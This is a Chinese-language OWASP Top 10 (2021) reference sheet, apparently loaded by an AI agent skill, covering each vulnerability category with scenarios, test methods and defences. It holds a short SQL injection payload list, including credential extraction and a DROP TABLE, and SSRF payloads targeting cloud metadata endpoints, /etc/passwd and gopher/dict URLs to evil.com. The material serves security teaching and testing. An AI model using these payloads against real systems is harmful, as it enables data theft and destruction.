> 被 SKILL.md "10. On-Demand References" 索引。需要 OWASP Top 10 漏洞分类参考时加载。
>
> **版本说明**：OWASP Top 10 (2021) 为 Web Application Security 当前最新正式版本。
> OWASP 已宣布短期内不会有新版 Top 10 Web Applications。
> 对 LLM/AI 应用安全场景，请参考 OWASP Top 10 for LLM Applications (2023) →
> https://owasp.org/www-project-top-10-for-large-language-model-applications/

# OWASP Top 10 (2021) 参考

## A01:2021 - Broken Access Control（访问控制失效）

**描述**：未正确实施访问控制，导致用户可执行其权限之外的操作。

**常见场景**：
- URL 参数篡改绕过权限检查
- CORS 配置错误允许跨域请求
- 目录遍历（Path Traversal）
- JWT Token 未验证或弱签名
- 水平越权（IDOR - Insecure Direct Object Reference）
- 垂直越权（普通用户访问管理员功能）

**测试方法**：
- 修改 URL 中的用户 ID 参数
- 尝试直接访问管理页面
- 使用不同角色 Token 访问 API
- 检查 CORS 头 `Access-Control-Allow-Origin`

**防护方案**：
- 实施最小权限原则（Principle of Least Privilege）
- 服务端统一鉴权中间件
- 禁用目录列表
- JWT 使用强签名算法（RS256/ES256），拒绝 `alg: none`
- 记录并监控访问控制失败事件

## A02:2021 - Cryptographic Failures（加密机制失效）

**描述**：敏感数据未加密或使用弱加密算法导致数据泄露。

**常见场景**：
- 明文传输敏感数据（无 HTTPS/TLS）
- 使用弱加密算法（MD5、SHA1、DES、RC4）
- 硬编码密钥/密码
- 不安全的随机数生成 (`java.util.Random` 代替 `SecureRandom`)
- 证书验证被禁用

**测试方法**：
- 检查是否强制 HTTPS（HSTS 头）
- 分析 Cookie 安全属性（Secure、HttpOnly、SameSite）
- 检查密码存储方式（是否为 bcrypt/scrypt/Argon2）
- 审查 SSL/TLS 配置（使用 testssl.sh）

**防护方案**：
- 全站强制 HTTPS + HSTS
- 密码存储使用 Argon2id / bcrypt / scrypt + 随机盐值
- 使用 AES-256-GCM 或 ChaCha20-Poly1305 进行对称加密
- 使用 TLS 1.2+，禁用 SSL/早期 TLS
- 密钥管理使用 KMS / HSM / Vault

## A03:2021 - Injection（注入）

**描述**：不可信数据被作为命令或查询的一部分发送到解释器。

**常见场景**：
- SQL 注入（SQLi）
- 命令注入（OS Command Injection）
- LDAP 注入
- XPath 注入
- NoSQL 注入
- 表达式语言注入（EL Injection）
- 模板注入（SSTI - Server-Side Template Injection）

**SQL 注入测试 Payload**：
```
' OR '1'='1
' UNION SELECT NULL--
' UNION SELECT username, password FROM users--
' OR SLEEP(5)--
'; DROP TABLE users; --
```

**防护方案**：
- 使用参数化查询（Prepared Statement）
- 使用 ORM 框架的安全 API
- 输入验证（白名单优于黑名单）
- 存储过程（需正确使用）
- 最小数据库权限原则
- WAF 防护层

## A04:2021 - Insecure Design（不安全设计）

**描述**：缺少安全设计环节，导致架构层面存在安全缺陷。

**常见场景**：
- 无速率限制（暴力破解、撞库）
- 密码重置流程存在逻辑缺陷
- 用户枚举漏洞
- 敏感操作无二次验证
- 缺乏安全开发流程（Threat Modeling）

**防护方案**：
- 安全设计评审（Security Design Review）
- 威胁建模（STRIDE、Attack Trees）
- 安全需求纳入用户故事
- 速率限制与账户锁定策略
- 关键操作强制 MFA

## A05:2021 - Security Misconfiguration（安全配置错误）

**描述**：应用程序、框架、服务器、数据库等的默认配置未被安全加固。

**常见场景**：
- 默认账户/密码未修改
- 详细错误信息返回给客户端（Stack Trace 泄露）
- 不必要的 HTTP 方法开启（PUT、DELETE、TRACE）
- 目录列表开启
- 云存储桶公开访问
- 默认应用程序安装页面未移除

**测试方法**：
- 检查响应头（Server、X-Powered-By 等版本信息）
- 测试 HTTP 方法（OPTIONS 请求）
- 尝试访问 `/admin`、`/phpinfo.php`、`/actuator` 等默认路径
- 测试 CORS 配置

**防护方案**：
- 自动化配置检查（CIS Benchmark）
- 最小化平台（移除不需要的功能/组件）
- 禁用详细错误信息
- 定期漏洞扫描和配置审计
- 使用安全标头（CSP、X-Frame-Options、X-Content-Type-Options）

## A06:2021 - Vulnerable and Outdated Components（易受攻击和过时的组件）

**描述**：使用已知漏洞的组件（库、框架、插件）。

**常见场景**：
- Log4Shell (CVE-2021-44228)
- Spring4Shell (CVE-2022-22965)
- Fastjson 反序列化漏洞
- Struts2 系列漏洞
- 过时的 jQuery 版本存在 XSS

**防护方案**：
- SCA（Software Composition Analysis）工具持续扫描
- 依赖版本锁定
- 定期更新补丁
- 仅使用官方源获取组件
- 监控 CVE/NVD 公告

## A07:2021 - Identification and Authentication Failures（身份识别与认证失败）

**描述**：认证机制缺陷导致身份冒用。

**常见场景**：
- 弱密码策略
- 会话固定（Session Fixation）
- 会话 ID 暴露在 URL 中
- 无会话超时机制
- 认证绕过（参数篡改）
- 凭证填充（Credential Stuffing）无防护

**防护方案**：
- 多因素认证（MFA/2FA）
- 强密码策略
- 登录失败限制 + 渐进式延迟
- 安全的会话管理（登录后更换 Session ID、设置超时）
- 使用安全的认证框架（OAuth 2.0 + PKCE、OIDC）

## A08:2021 - Software and Data Integrity Failures（软件与数据完整性失效）

**描述**：未验证软件更新、CI/CD 管道、关键数据的完整性。

**常见场景**：
- 不安全的反序列化
- CI/CD 管道被投毒
- 依赖混淆攻击
- 自动更新无签名验证
- SolarWinds 类型供应链攻击

**防护方案**：
- 数字签名验证（软件更新、关键数据）
- 依赖完整性校验（SRI - Subresource Integrity）
- CI/CD 管道安全审查
- 依赖混淆防护（私有包命名空间、scope）

## A09:2021 - Security Logging and Monitoring Failures（安全日志与监控失效）

**描述**：日志记录不足或监控缺失，导致攻击无法被及时发现。

**常见场景**：
- 登录失败未记录
- 日志未包含足够上下文
- 日志存储在受攻击的同一台服务器
- 无实时告警
- 日志未受保护（可被篡改/删除）

**防护方案**：
- 记录所有认证事件、访问控制失败、输入验证失败
- 日志包含足够上下文（用户、时间戳、IP、User-Agent、操作类型）
- 日志集中存储（SIEM）并设置只读权限
- 配置实时告警规则
- 日志保留策略合规（等保要求 6 个月+）

## A10:2021 - Server-Side Request Forgery (SSRF)（服务端请求伪造）

**描述**：服务端在未验证目标 URL 的情况下发起请求。

**常见场景**：
- 图片/文件 URL 代理
- Webhook 回调
- URL 导入功能（RSS、OEmbed）
- 云元数据服务（169.254.169.254）

**测试 Payload**：
```
http://169.254.169.254/latest/meta-data/         # AWS
http://metadata.google.internal/                  # GCP
http://100.100.100.200/latest/meta-data/           # 阿里云
http://metadata.tencentyun.com/latest/meta-data/   # 腾讯云
file:///etc/passwd
gopher://evil.com:8080/_POST%20/...
dict://evil.com:11211/
```

**防护方案**：
- 输入验证（URL 白名单）
- 禁用不需要的协议（file://、gopher://、dict://）
- 网络层隔离（元数据服务访问控制）
- 响应验证（不返回原始响应给用户）
